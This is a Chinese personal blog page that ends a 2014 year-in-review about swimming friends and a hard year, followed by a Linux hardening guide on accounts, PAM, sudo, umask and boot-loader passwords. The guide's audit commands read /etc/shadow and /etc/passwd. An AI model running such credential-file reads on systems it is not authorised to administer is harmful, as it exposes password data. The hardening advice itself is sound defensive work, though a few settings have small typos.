<p>扯旗呢，和扯旗认识算是因为扯旗和阿花认识，扯旗和阿花怎么认识，我怎么知道。大概是某个邪恶的北邮人游泳群。对了，一月份错过了今年，估计也是唯一一次的群聚，也算遗憾吧，考试可能只是借口，我害羞了吧。不扯远，扯旗给我的印象，就是拿着手蹼坑吃坑吃在水里拼命劳动。扯旗说：人生本来就是与大自然抗争的过程。对此，我只能弱弱地点下赞。后来，去人大，算是渐渐和扯旗熟了些。那时候他已经在某互联网公司产品经理实习，渐渐越来越忙。开始还一起去一起回，后来能周二周四见到他和他公司游泳社几个人，再后来……唉？关于扯旗有个传说：从前北邮的游泳池有个游得特别赞的女神，被扯旗拐走了= =。扯旗简直能扯，游泳群里的荔枝都叫他扯淡鱼，说起话一套一套的，救生员lt对扯旗评价甚高：扯旗这个人啊，特别能XX，特别能XX，特别能XX。我会永远记住某君把我黑上论坛十大的仇的，哼。实验室现在还有人因为扯旗嘲笑我，哼。祝工作顺利，身体健康，生活幸福！</p>
<p>彬哥某次版聚教我自由泳：怎么舒服怎么来，就这样，我给你说我们怎么游，哗——哗——哗——……不是很熟，比我高一届似乎又比较忙，只记得群里有次有人出计算所的游泳票，彬哥干脆全买下来请大家去游。虽然最后未能成行= =。</p>
<p>大概四五月份开始，工作又经过大的变动。短短几个月三次大变。开始还好，也过得简简单单随随便便。从八月开始，丧心病狂的日子开始了，甲方催得紧，身体不好，项目管理又比较乱，我觉得在浪费自己和大家的时间，另外身体不好也不愿意加班，反而更拼命游泳去了。那段日子想，干脆退学得了，这日子简直无聊。</p>
<p>还有些别扭，组长师姐、已经毕业的gx湿胸之间情谊放着，不想坑他们。</p>
<p>不过我做的事情已经传递出这么一种态度，让我滚吧= =</p>
<p>那天翔哥来这边签字什么的，下去送他去保卫处，随便谈了下。在学二十九下仰头看天上的流云，直到脖子酸掉。</p>
<p>我终于是没有退学，老师没有赶我走。</p>
<p>老师说生病了就先休息吧，到时候再回来。</p>
<p>我心软了。</p>
<p>但却似乎一下从坑中跳了出来，今后种种手忙脚乱，都与我擦肩而过。这么一档子事过后，说不清福祸。</p>
<p>那段时间，对逆向痴迷了一阵。Reverse engineer for beginner也没有看完，也算2014的一大遗憾吧。</p>
<p>从那段时间起，我开始想放弃做技术了。</p>
<p>不管怎样，我玩命的游泳去。</p>
<p>那段日子是烧钱去游泳。</p>
<p>也是玩命去游泳</p>
<p>我的支气管炎大概一个多月才彻底好。</p>
<p>对我来说，虽然是很乱的日子，也是很难忘的日子。</p>
<p>那段时间，北邮游泳馆修屋顶关闭。</p>
<p>第一天下午，先去了北师，问了下价格和办卡的方案。</p>
<p>感觉简直坑啊，想要么把北京游个遍？上网搜了下人大似乎还不错，可以办300元的十五次卡。</p>
<p>我当时是怎么想的，在群里说我要去人大。第一次认识了丹丹。我不是会表达感谢的人。虽然一直想说，谢谢。刚认识不久的日子就感冒不能下水，热心惦念着给我送了一大袋子梨。我觉得她正如她所说的：做一个温暖的人，爱身边每一个人。大概永远不会忘记狂风暴雨中一起穿越地下通道和天桥，穿过积水和淋漓的雨，穿过帝都电闪雷鸣的夜就为了去游个泳的记忆。不会忘记她在我有次跳水时加油的手势和笑容。她给我的，阳光、温暖和热情，像拨开黑夜的光芒，照亮前行的路与迟疑的心。后来开学了= =……给我发了个满是课的课程表= =……再见得就少了。希望这么温暖阳光的女孩能一直这么下去，and best bless.</p>
<p>这段日子，断断续续认识了些喜欢去游泳的朋友。涂涂、范老师、黄老师、qd等吧。</p>
<p>中途回家一次，直系亲属癌症手术，两位直系血亲罹患癌症，唉。不管怎样，大家都还拼命活着，已经很幸福了。</p>
<p>后来，实验室也不会让我闲着，做起了其它东西，但没什么甲方压力轻松自由多了。简直不想错过一天去游泳的日子，每天都去，大概是被涂涂、丹丹、范老师他们刺激了，大概由于zq的教导和扯旗的理论，终于认真学习游泳了。</p>
<p>看看topswim，问问zq，自己练练。几个救生员说，唉，没白天天来啊，蛙泳游得不错啊。渐渐和救生员熟悉了，每次去总要打个招呼开开玩笑啥的，进深水区从来不拿深水证……= =。特别是某个叫lt的救生员，总是一边用眼神往远处瞄，一边压低声音偷偷对我说，看，那个穿XX的妹子。转眼年底，ho走了，lt走了，tzp走了。祝好。</p>
<p>到此为止吧，再不回去宿舍就锁门了。其它，随风去吧。之前老妈太拼得了个肺炎，吓了一跳。转眼我自己又是毛病，回去早点休息，身体简直差。过两天还得去北医三院。</p>
<p>今天太短，明天太远。</p>
<p>短暂今天的相识相遇是我最宝贵的记忆之一。</p>
<p>2014,再见。</p>
<p>你好，2015</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2014/11/20/account-and-access-control/" itemprop="url">
                  Account and Access Control
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-11-20T00:00:00+08:00" content="2014-11-20">
              2014-11-20
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2014/11/20/account-and-access-control/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/11/20/account-and-access-control/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>传统的Unix中，一旦攻击者获得对应帐号的shell，他就能执行该账户所能行使的任何行为，存取该账户能存取的任何文件。因此，让未授权的人获得指定帐号shell更加困难(特别是对权限账户)，是系统安全重要的部分。本文介绍如何引入限制账户登录的机制。</p>
<h2 id="限制基于密码的登录来保护账户">限制基于密码的登录来保护账户</h2><p>传统Unix账户通过提供用户名和密码登录，这些用户名和密码会和储存在<code>/etc/passwd</code>和<code>/etc/shadow</code>中的内容对比。密码登录可能被被猜测，被嗅探，被中间人截取，无论是从网络还是不安全的控制台中。因此，限制账户密码登录的机制很重要。</p>
<h3 id="限制root只能在系统控制台登录">限制root只能在系统控制台登录</h3><p>编辑<code>/etc/securetty</code>，确保只有以下行：</p>
<ul>
<li><p>基本的系统控制台设备：</p>
<pre><code><span class="built_in">console</span>
</code></pre></li>
<li><p>虚拟控制台设备</p>
<pre><code>tty1
tty2
tty3
tty4
...
</code></pre></li>
<li><p>如果需要，保留这些废弃的控制台接口来保留向后兼容。</p>
<pre><code>vc/<span class="number">1</span>
vc/<span class="number">2</span>
...
</code></pre></li>
<li><p>如果需要，添加串口控制台：</p>
<pre><code><span class="title">ttyS0</span>
ttyS1
</code></pre></li>
</ul>
<p>仅在紧急情况下才允许root直接登录。通常，管理员可以通过唯一的非权限用户使用<code>su</code>或者<code>sudo</code>来执行权限命令。不鼓励管理员直接使用root用户有助于对多管理员系统的审计工作。减少root能直接连接的通道减少了root密码被猜解的几率。</p>
<p><code>login</code>程序使用<code>/etc/securetty</code>确定哪些接口允许root登录。虚拟设备<code>/dev/console</code>和<code>/dev/tty*</code>代表系统控制台(通过<code>Ctrl-Alt-F1</code>等打开)。默认的<code>securetty</code>文件也包含<code>/dev/vc/*</code>，来保留历史兼容性。</p>
<p>root用户也应该禁止通过网络协议登录。本文暂不讨论。</p>
<h3 id="限制su到root账户">限制su到root账户</h3><p>确保组<code>wheel</code>存在，所有持有root权限的管理员用户名作为其中的组员。</p>
<pre><code><span class="keyword">grep</span> ^wheel <span class="regexp">/etc/g</span>roup
</code></pre><p>编辑文件<code>/etc/pam.d/su</code>，添加、注释或者更改该行：</p>
<pre><code>auth    required    pam_wheel<span class="class">.so</span>    use_uid
</code></pre><p><code>su</code>命令允许用户从其它用户通过输入密码获得权限。因此限制已知管理员使用root是必要的。一般<code>wheel</code>用户组包含允许运行权限命令的全部用户。PAM模块<code>pam_wheel.so</code>被用来限制一组用户的接入。</p>
<h3 id="配置sudo改善对root访问的审计">配置sudo改善对root访问的审计</h3><p>确保<code>wheel</code>存在，所有持有root权限的管理员用户名作为其中的组员。</p>
<pre><code><span class="keyword">grep</span> ^wheel <span class="regexp">/etc/g</span>roup
</code></pre><p>编辑<code>/etc/sudoers</code>，添加、取消注释或者更改如下行：</p>
<pre><code>%wheel  <span class="built_in">ALL</span>=(<span class="built_in">ALL</span>)   <span class="built_in">ALL</span>
</code></pre><p><code>sudo</code>能很好的控制哪个用户能用其它账户执行命令。这为每个权限用户执行的命令提供了审计可能。也许恶意管理员会绕过这个限制，但这个机制保证审计更容易。</p>
<p>手工编辑<code>/etc/sudoer</code>很危险，配置错误也许会禁用远程root访问。推荐的方式是用<code>visudo</code>命令编辑这个文件，该命令会在保存前检查文件语法。</p>
<p>权衡sudo带来的审计好处和安全风险。永远不要使用<code>NOPASSWD</code>指令，这会允许任何获取管理员账户的人在不知管理员密码的情况下以root身份执行命令。</p>
<p>更多定制参见<code>sudoers</code> man页面</p>
<h3 id="禁止非root系统账户登录和使用shell">禁止非root系统账户登录和使用shell</h3><p>！！！！！！！！注意：不要对root执行以下配置</p>
<p>使用一下命令查看<code>/etc/passwd</code></p>
<pre><code>awk -F: '{<span class="literal">print</span> <span class="variable">$1</span> <span class="string">":"</span> <span class="variable">$3</span> <span class="string">":"</span> <span class="variable">$7</span>}' /etc/passwd
</code></pre><p>找到那些UID低于500(系统账户)，不是root的账户：</p>
<p>对每个系统账户<code>SYSACCT</code>，锁定：</p>
<pre><code><span class="title">usermod</span> -L SYSACCT
</code></pre><p>禁用它们的shell：</p>
<pre><code>usermod <span class="operator">-s</span> /sbin/nologin SYSACCT
</code></pre><h3 id="确认密码被适当存储和哈希">确认密码被适当存储和哈希</h3><h4 id="确保没有账户有空密码">确保没有账户有空密码</h4><p>使用以下命令查看：</p>
<pre><code>awk -<span class="string">F:</span> <span class="string">'($2 == "") {print}'</span> <span class="regexp">/etc/</span>shadow
</code></pre><p>如果有输出，检查这些账户并设置密码。</p>
<h4 id="确保所有账户密码哈希都被shadow">确保所有账户密码哈希都被shadow</h4><p>确保没有在<code>/etc/passwd</code>中保存密码哈希：</p>
<pre><code>awk -<span class="string">F:</span> <span class="string">'($2 != "x") {print}'</span> <span class="regexp">/etc/</span>passwd
</code></pre><p>这个命令应该没有输出，所有密码哈希应该保存在<code>/etc/shadow</code>而不是所有用户都能读的<code>/etc/passwd</code></p>
<h3 id="确认没有非root用户的UID为0">确认没有非root用户的UID为0</h3><p>列出所有UID为0的用户：</p>
<pre><code>awk -<span class="string">F:</span> <span class="string">'($3 == "0") {print}'</span> <span class="regexp">/etc/</span>passwd
</code></pre><p>通常，最好的审计实践是所有root账户的使用都限制到使用su或这sudo。有些站点使用多个管理员拥有UID 0，这种做法可能有意料外的副作用，并不推荐。</p>
<h3 id="设置密码过期参数">设置密码过期参数</h3><p>编辑<code>/etc/login.defs</code>指定某个新账户的密码过期时间。添加或修改如下行：</p>
<pre><code>PASS_MAX_DAYS <span class="number">60</span>
PASS_MIN_DAYS <span class="number">7</span>
PASS_MIN_LEN <span class="number">14</span>
PASS_WARN_AGE <span class="number">7</span>
</code></pre><p>对已经存在的人类用户<code>USER</code>，更改当前过期设置如下：</p>
<pre><code>chage -M <span class="number">60</span> -m <span class="number">7</span> -W <span class="number">7</span> USER
</code></pre><p>更改密码要在稳定性和安全性之间权衡，90到360天比较推荐。</p>
<h4 id="从libuser-conf移除密码参数">从libuser.conf移除密码参数</h4><p>确保<code>/etc/libuser.conf</code>在<code>[import]</code>节包含：</p>
<pre><code>login_defs = <span class="regexp">/etc/login</span>.defs
</code></pre><p>同时确保在<code>[userdefaults]</code>下没有以下单词开头的行，这些设定会覆盖<code>/etc/log   in.defs</code>的设定：</p>
<pre><code><span class="title">LU_SHADOWMAX</span>
LU_SHADOWMIN
LU_SHADOWWARNING
</code></pre><p><code>/etc/libuser.conf</code>文件包含libuser库的配置选项，这个库提供了一套操作和管理用户和组帐号的标准接口。默认情况下从<code>/etc/login.defs</code>读取密码设置，但是<code>/etc/libuser.conf</code>能覆盖这些参数。查看<code>libuser.conf</code>的man页面获取更多信息。</p>
<h3 id="移除密码文件中遗留的+条目">移除密码文件中遗留的+条目</h3><p>用一下命令找到这些行：</p>
<pre><code><span class="keyword">grep</span> <span class="string">"^+:"</span> <span class="regexp">/etc/</span>passwd <span class="regexp">/etc/</span>shadow <span class="regexp">/etc/g</span>roup
</code></pre><p>确保没有输出。</p>
<p><code>+</code>被用来将来自NIS的数据映射到已知文件。一个<code>/etc/passwd</code>中NIS包含错误，但NIS没有运行会导致任意用户以<code>+</code>用户名免密码访问。</p>
<p>告诉本地系统使用网络数据库，比如LDAP或NIS，来获取用户信息的正确的方式是确保在<code>/etc/nsswitch.conf</code>中适当的配置。</p>
<h2 id="通过Unix组来加强安全">通过Unix组来加强安全</h2><p>通过标准Unix权限的访问控制很弱，但也可以利用。</p>
<h3 id="为每个账户创建一个唯一默认组">为每个账户创建一个唯一默认组</h3><p>当使用<code>useradd</code>命令时，不要使用<code>-g</code>参数覆盖默认组。</p>
<p>RedHat默认为每个用户创建相同名称的唯一所属组。推荐这样，保护组写权限的文件。</p>
<h3 id="创建和维护包含所有人类账户的组">创建和维护包含所有人类账户的组</h3><p>找到系统上所有人类用户，比如UID大于500的，一旦确认，创建一个<code>usergroup</code>组，并且把每个人类账户加进去：</p>
<pre><code>groupadd usergroup
usermod -G usergroup huma<span class="label">n1</span>
usermod -G usergroup huma<span class="label">n2</span>
usermod -G usergroup huma<span class="label">n3</span>
usermod -G usergroup huma<span class="label">n4</span>
</code></pre><p>当用<code>useradd</code>添加新用户时，用<code>-G usergroup</code>将人类账户添加到改组。</p>
<p>这样做便于管理人类用户，比如为<code>/path/to/graphical/command</code>授权用户：</p>
<pre><code>chgrp usergroup /path/<span class="built_in">to</span>/graphical/<span class="command"><span class="keyword">command</span></span>
chmod <span class="number">750</span> /path/<span class="built_in">to</span>/graphical/<span class="command"><span class="keyword">command</span></span>
</code></pre><p>同时，限制非人类系统账户执行命令也非常重要。</p>
<h2 id="通过配置PAM保护帐号">通过配置PAM保护帐号</h2><p>PAM，可插拔认证模块是为linux程序提供认证的模块。PAM是一个框架，提供可配置的系统认证架构来最小化系统所面对的风险。</p>
<p>PAM被作为一套动态共享库实现，在任何应用程序想认证用户的时候被加载和调用。通常为了使用PAM应用程序需要以root运行，传统的权限网络监听比如sshd和SUID程序比如sudo已经满足了这个要求。一个叫做<code>userhelper</code>的SUID root应用被用来为没有SUID或权限的程序提供利用PAM的可能。</p>
<p>PAM在<code>/etc/pam.d/</code>下搜寻应用特异的配置信息。比如对<code>login</code>程序，PAM库会遵循<code>/etc/pam.d/login</code>中的指示。</p>
<p>一个非常重要的文件是<code>/etc/pam.d/system-auth</code>。这个文件被许多其它文件包含(奇怪的是从RHEL6开始sshd只包含<code>/etc/pam.d/password-auth</code>)，作为默认的系统认证措施，更改这个文件能确保全面的更改。</p>
<p>更改PAM的配置要十分小心，语法很复杂，更改可能有意料外的结果。默认配置对大多数用户足够了。</p>
<p>注意！！！！！！！！！！：运行<code>authconfig</code>或者<code>system-config-authentication</code>将覆盖PAM配置文件，摧毁任何手动的更改，将其覆盖成系统默认。</p>
<h3 id="设定密码质量要求">设定密码质量要求</h3><p>默认的PAM模块<code>pam_cracklib</code>提供了加强的密码检查。它可以执行一系列检查包含字典单词的相似，最小长度，不是之前的密码，不是之前密码的简单大小写修改等。也能要求密码包含特定类型的字符。</p>
<p><code>pam_passwdqc</code>模块提供了更严格的密码强度强制要求。可通过RPM包下载。</p>
<h4 id="如果使用pam_cracklib,设置密码质量需求">如果使用pam_cracklib,设置密码质量需求</h4><p>用<code>pam_cracklib</code>配置密码至少包含一个大写、小写、数字和其它字符，定位<code>/etc/pam.d/system-auth</code>中的一下行：</p>
<pre><code>password requisite pam_cracklib<span class="class">.so</span> retry=<span class="number">3</span>
</code></pre><p>更改为(呵呵，required意指即使失败仍然会继续后面required的模块验证，然后在返回错误，让用户不知道哪里出的问题)</p>
<pre><code>password required pam_cracklib.so retry=<span class="number">3</span> minlen=<span class="number">14</span> \
                    dcredit=-<span class="number">1</span>, ucredit=-<span class="number">1</span> ocredit=-<span class="number">1</span> lcredit=-<span class="number">1</span>
</code></pre><p>如果必要，更改为符合你要求的配置。</p>
<h4 id="如果使用pam_passwdqc,设置密码质量需求">如果使用pam_passwdqc,设置密码质量需求</h4><p>如果需要比<code>pam_cracklib</code>保证的密码强度更强，使用<code>pam_passwdqc</code>模块。</p>
<p>更改<code>/etc/pam.d/system-auth</code>中的如下行：</p>
<pre><code>password requisite pam_cracklib<span class="class">.so</span> retry=<span class="number">3</span>
</code></pre><p>为(呵呵，这个直接requisite，只要不符合要求PAM就直接返回错误了)<br>    password requisite pam_passwdqc.so min=disabled,disabled,16,12,8</p>
<p>按自己需要配置。</p>
<h3 id="设置失败密码尝试锁定">设置失败密码尝试锁定</h3><p>使用<code>pam_tally2.so</code>模块来实现一定数量错误登录尝试后锁定账户。在<code>/etc/pam.d/system-auth</code>中添加到第一个auth开头的行上头(呵呵，RHEL6后<code>/etc/pam.d/sshd</code>包含的是<code>/etc/pam.d/password-auth</code>而不是<code>/etc/pam.d/system-auth</code>，所以，对ssh登录尝试锁定应该是对<code>password-auth</code>这个文件更改。)</p>
<pre><code>auth required pam_tally2.so deny=<span class="number">5</span> onerr=fail unlock_time=<span class="number">900</span>
</code></pre><p>在account开头的行上头加上一行：</p>
<pre><code><span class="tag">account</span> <span class="tag">required</span> <span class="tag">pam_tally2</span><span class="class">.so</span>
</code></pre><p>root要单独设置<code>root_unlock_time=900</code></p>
<p>要解锁用户使用<code>pam_tally2</code>命令</p>
<pre><code>/sbin/pam_tally2 --<span class="keyword">user</span> <span class="title">username</span> --reset
</code></pre><p>锁定用户造成潜在的DOS攻击，但能阻止密码猜解。权衡利弊设置<code>unlock_time</code></p>
<h3 id="使用pam_deny-so快速禁止访问服务">使用pam_deny.so快速禁止访问服务</h3><p>通过PAM阻止服务SVCNAME的访问，编辑<code>/etc/pam.d/SVCNAME</code>文件，添加这一行：</p>
<pre><code><span class="tag">auth</span>    <span class="tag">requisite</span>   <span class="tag">pam_deny</span><span class="class">.so</span>
</code></pre><p>这不是啥值得推荐的方法，不过挺方便，呵呵。</p>
<h3 id="仅控制台用户执行userhelper">仅控制台用户执行userhelper</h3><p>如果你的环境定义了一个组<code>usergroup</code>包含所有系统上的人类用户，限制<code>userhelper</code>程序只能由这些用户执行。(4710中的4表示suid/guid)</p>
<pre><code>chgrp usergroup <span class="regexp">/usr/</span>sbin/userhelper
chmod <span class="number">4710</span> <span class="regexp">/usr/</span>sbin/userhelper
</code></pre><p><code>userhelper</code>程序提供必须以root运行的图形服务认证，比如<code>system-config-</code>族图形配置程序。只有登录到系统控制台的人类用户可以运行这些。以上提供了一定对<code>userhelper</code>实现缺陷的保护，防止被侵入的系统账户进一步提权。</p>
<p><code>userhelper</code>程序在<code>/etc/securetty/console.app/</code>下的文件配置。每个文件指定了程序以什么身份运行，成功认证后应该执行什么。</p>
<p>注意：这些配置和PAM的配置<code>/etc/pam.d</code>下的配置相配合才能起作用。首先<code>userhelper</code>决定服务应该以什么身份运行(比如root)，然后<code>userhelper</code>使用PAM API来允许运行程序的用户尝试认证为想要借身份运行的用户。PAM的API交互被封装在GUI中，如果程序配置要求的话。</p>
<h3 id="升级密码哈希算法到SHA-512">升级密码哈希算法到SHA-512</h3><p>需要编辑3个文件：</p>
<p>首先<code>/etc/pam.d/system-auth</code>中确保sha512被<code>pam_unix.so</code>模块在password节使用。而不是使用其它算法：(可能得改password-auth)</p>
<pre><code>password sufficient pam_unix<span class="class">.so</span> sha512 shadow nullok try_first_pass use_authtok
</code></pre><p>其次，编辑文件<code>/etc/login.defs</code>添加或更改以下行(确认下就好)：</p>
<pre><code><span class="title">ENCRYPT_METHOD</span> SHA512
</code></pre><p>最后，编辑<code>/etc/libuser.conf</code>添加或更改以下行：</p>
<pre><code><span class="attribute">crypt_style</span>=<span class="string">sha512</span>
</code></pre><p>其实吧，这是RHEL6的默认配置，呵呵。</p>
<h3 id="限制密码重用">限制密码重用</h3><p><code>pam_unix</code>模块使用<code>remember</code>参数可以防止用户重用最近的密码。为了阻止用户使用最近5次的密码，向<code>/etc/pam.d/system-auth</code>文件中，使用<code>pam_unix</code>模块的<code>password</code>行添加<code>remember=5</code>参数。</p>
<p>旧的密码(禁止重用的)保存在<code>/etc/security/opasswd</code>中。</p>
<h3 id="尽可能移除pam_crreds包">尽可能移除pam_crreds包</h3><p>除非用到认证缓存功能，移除<code>pam_ccreds</code>包：</p>
<pre><code>yum <span class="built_in">erase</span> pam_ccreds
</code></pre><p>该包包含setuid文件<code>/usr/sbin/ccreds_validate</code>。如果系统被入侵，任何系统上缓存的认证信息都会被获取。</p>
<h2 id="对登录用户使用安全会话配置文件">对登录用户使用安全会话配置文件</h2><p>当一个用户登录进Unix账户时，系统通过读取大量文件配置用户会话。许多这些文件在家目录下。错误或者不当的配置都会造成弱权限。攻击者可以修改甚至读取特定类型的账户信息，对受影响的账户获得全面的访问权限。因此，额是和修正账户特别是权限账户的配置文件权限非常重要。</p>
<h3 id="确保Root_PATH不存在危险目录">确保Root PATH不存在危险目录</h3><p>登录一个root shell运行：</p>
<pre><code>echo <span class="variable">$PATH</span>
</code></pre><p>将给出冒号分隔的文件夹路径。</p>
<p>防止root执行未知或者不受信任的程序很重要，这些程序可能带有恶意代码。因此，root不应该运行非权限用户安装的程序。root经常工作在不受信任的目录，比如<code>.</code>代表的当前目录总不该出现在root的PATH中，任何非权限用户或系统用户能写入的目录都是如此。</p>
<p>对系统管理员来说，总是打出命令的绝对路径是个好习惯。</p>
<h4 id="确保Root_PATH不包含相对路径或者空目录">确保Root PATH不包含相对路径或者空目录</h4><p>对每个路径中的目录<code>DIR</code>，确保<code>DIR</code>不是一个单一的<code>.</code>，或者任何可能导致相对路径遍历的符号比如<code>..</code>，或者不是以<code>/</code>开头。同时，确保路径中没有空元素，如下：</p>
<pre><code><span class="constant">PATH=</span><span class="symbol">:/bin</span>
<span class="constant">PATH=</span>/<span class="symbol">bin:</span>
<span class="constant">PATH=</span>/<span class="symbol">bin:</span><span class="symbol">:/sbin</span>
</code></pre><p>这些空元素和一个<code>.</code>有相同效果。</p>
<p>我觉得这样比较方便：</p>
<pre><code>echo <span class="variable">$PATH</span> | awk -F: <span class="string">'{for(i=1;i&lt;NF;i++) print $i}'</span>
</code></pre><h4 id="确保ROOT路径不包含全局可写或组可写的目录">确保ROOT路径不包含全局可写或组可写的目录</h4><p>对PATH中的每一个元素，执行：</p>
<pre><code><span class="keyword">ls</span> -ld <span class="keyword">DIR</span>
</code></pre><p>确保组和其它的写权限被禁用。</p>
<p>我觉得这样比较好：</p>
<pre><code>ls -ld `echo <span class="variable">$PATH</span> | awk -F: <span class="string">'{for(i=1;i&lt;NF;i++) print $i}'</span>`
</code></pre><h3 id="确保用户家目录不是组可写或者全局可读的">确保用户家目录不是组可写或者全局可读的</h3><p>首先通知你的用户。</p>
<p>对每个人类账户<code>USER</code>，查看账户权限：</p>
<pre><code>ls -<span class="keyword">ld</span> /home/USER
</code></pre><p>确保目录不是组可写和全局可读的，必要时修正：</p>
<pre><code>chmod g-w /home/<span class="keyword">USER</span>
<span class="title">chmod</span> o-rwx /home/USER
</code></pre><p>家目录包含许多影响账户行为的配置，其它用户不该有权限写入。组共享目录应该在子目录或者其它什么地方而不是家目录。通常，家目录也不该全局可读。如果有一小撮用户非得读取其它用户目录，通过组来提供权限。</p>
<h3 id="确保用户dot文件不是全局可写">确保用户dot文件不是全局可写</h3><p>确保用户USER家目录下的dot文件不是全局可写：</p>
<pre><code>ls -ld /home/<span class="keyword">USER</span> <span class="title">/.[A-Za-z0-9</span>]*
</code></pre><p>确保任何文件都不是组或全局可写的。通过以下方式修正某个<code>FILE</code>：</p>
<pre><code>chmod go-w /home/USER/<span class="keyword">FILE</span>
</code></pre><p>能更改其它用户配置文件的用户可能以那个用户权限执行命令，窃取数据，摧毁文件或者发起进一步攻击。</p>
<h3 id="确保用户有合理的umask值">确保用户有合理的umask值</h3><p>编辑全局配置<code>/etc/profile</code>,<code>/etc/bashrc</code>和<code>/etc/csh.cshrc</code>.添加或修改以下行:</p>
<pre><code><span class="built_in">umask</span> <span class="number">077</span>
</code></pre><p>其实profile里看是不是uid大于200且有效组名等于用户名,则设为002(目录775，文件644).否则设为022(目录755，文件644).</p>
<p>编辑<code>/etc/login.defs</code>:</p>
<pre><code>UMASK   <span class="number">077</span>
</code></pre><p>查看<code>/etc/csh.login</code>和<code>/etc/profile.d/*</code>中的其它文件，确保没有重定义umask。除非有什么好的理由重定义umask。</p>
<pre><code><span class="keyword">grep</span> -r umask <span class="regexp">/etc/</span>profile <span class="regexp">/etc/</span>csh.* <span class="regexp">/etc/</span>bashrc <span class="regexp">/etc/</span>login.defs
</code></pre><p>编辑root shell的配置文件<code>/root/.bashrc</code>和<code>/root/.bash_profile</code>,<code>/root/.cshrc</code>，<code>/root/.tcshrc</code>。添加或修改以下行：</p>
<pre><code><span class="built_in">umask</span> <span class="number">077</span>
</code></pre><p>这样做确保任何用户创建的文件不会被其它用户读写与执行。如果有特殊需要，则使用<code>chmod</code>命令修改它。单个用户可以通过将umask设为<code>027</code>让其所在组用户能读和执行其文件。用户名和默认组一致，完全可以直接设成<code>007</code>来与组成员共享文件。</p>
<p>另外，暂时更改root 的umask来安装能让其它用户读取的软件或文件，或者修改特定服务帐号的umask默认设定的行为，都是必要的。但严格的默认限制能更好的保护意外泄漏。</p>
<h3 id="确保用户没有-netrc文件">确保用户没有.netrc文件</h3><p>对每个人类用户<code>USER</code>，确保没有用户有<code>.netrc</code>文件。</p>
<pre><code><span class="built_in">find</span> /home -<span class="built_in">name</span> .netrc
</code></pre><p>应该没有返回。如果有联系用户讨论删除事宜。</p>
<p><code>.netrc</code>是用来通过ftp无人登录到其它系统的配置文件。这个文件通常包含攻击其它系统未加密的密码。</p>
<h2 id="保护物理控制台访问">保护物理控制台访问</h2><p>不大可能保护系统免于物理接触攻击。有些步骤能让攻击者更加难以快速和不被发现地从控制台更改系统。</p>
<h3 id="设置BIOS密码">设置BIOS密码</h3><p>x86系统的BIOS是机器首先运行代码的地方，控制着许多非常重要的系统参数，包含系统从哪个设备以什么顺序启动的信息。</p>
<p>为BIOS配置设置密码防止修改。尽管物理接触的攻击者通常很容易清除密码。</p>
<h3 id="设置Boot_Loader密码">设置Boot Loader密码</h3><p>Boot Loader通常负责启动内核并把参数传递给它。boot loader允许选择多个分区或者介质上的不同内核，能传递给内核的参数包括单用户模式(提供无需认证的root访问)，禁用SELinux。阻止本地用户更改启动参数。为防止本地用户更改启动参数危害安全，启动器配置需要用密码保护：</p>
<p>Grub这样保护：</p>
<p>运行<code>grub-md5-crypt</code>得到md5后的哈希<code>password-hash</code></p>
<p>在<code>/etc/grub.conf</code>注释头下第一行添加：</p>
<pre><code>password <span class="comment">--md5 password-hash</span>
</code></pre><p>确保<code>/etc/grub.conf</code>的权限。(指向<code>../boot/grub/grub.conf</code>)</p>
<pre><code>chown <span class="string">root:</span>root <span class="regexp">/etc/</span>grub.conf
chmod <span class="number">600</span> <span class="regexp">/etc/</span>grub.conf
</code></pre><p>其它boot loader有类似的密码保护特性。</p>
<h3 id="要求单用户模式登录认证">要求单用户模式登录认证</h3><p>单用户模式被设计用来回复系统，通过启动选项给单用户root权限。默认情况下不需要认证，这造成了安全隐患。</p>
<p>即使以单用户模式启动，也要求输入root密码。在<code>/etc/sysconfig/init</code>文件中更改：</p>
<pre><code>sed -i 's/SINGLE=<span class="command">\/</span>sbin<span class="command">\/</span>sushell/SINGLE=<span class="command">\/</span>sbin<span class="command">\/</span>sulogin/' /etc/sysconfig/init
</code></pre><h3 id="禁用交互式启动">禁用交互式启动</h3><p>编辑<code>/etc/sysconfig/init</code>。添加或更改设置：</p>
<pre><code>sed -<span class="tag">i</span> <span class="string">'s/^PROMPT.*/PROMPT=no/g'</span> /etc/sysconfig/init
</code></pre><p>交互式启动，用户也许能禁用审计、防火墙和其它服务弱化系统安全。</p>
<h3 id="对登录shell实现不活动超时">对登录shell实现不活动超时</h3><p>如果系统不运行X windows，登录shell可以配置为一段时间不活动自动登出用户。以下指令对运行X Windows的系统不合适，因为这将自动(深有体会！！)关闭X环境下的终端。</p>
<p>针对<code>/bin/bash</code>，实现一个15分钟的空闲超时，在目录<code>/etc/profile.d/</code>下新建文件<code>tmout.sh</code>，写入如下行：</p>
<pre><code>TMOUT=<span class="number">900</span>
<span class="built_in">readonly</span> TMOUT
<span class="built_in">export</span> TMOUT
</code></pre><p>对<code>tcsh</code>，在<code>/etc/profile.d/</code>下新建<code>autologout.sh</code>，添加如下行：</p>
<pre><code><span class="built_in">set</span> -r autologout <span class="number">15</span>
</code></pre><p>其它登录shell应该类似。</p>
<p>仅仅在shell是前台进程时才会自动登录超时。比如，一个<code>vi</code>会话空闲着并不会自动超时登出。</p>
<p>当通过远程连接时，比如SSH，通过该服务设置超时更加有效。</p>
<h3 id="配置锁屏">配置锁屏</h3><p>一个是图形界面的锁屏(比如kde的Lock Screen)，一个是控制台(vlock)。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

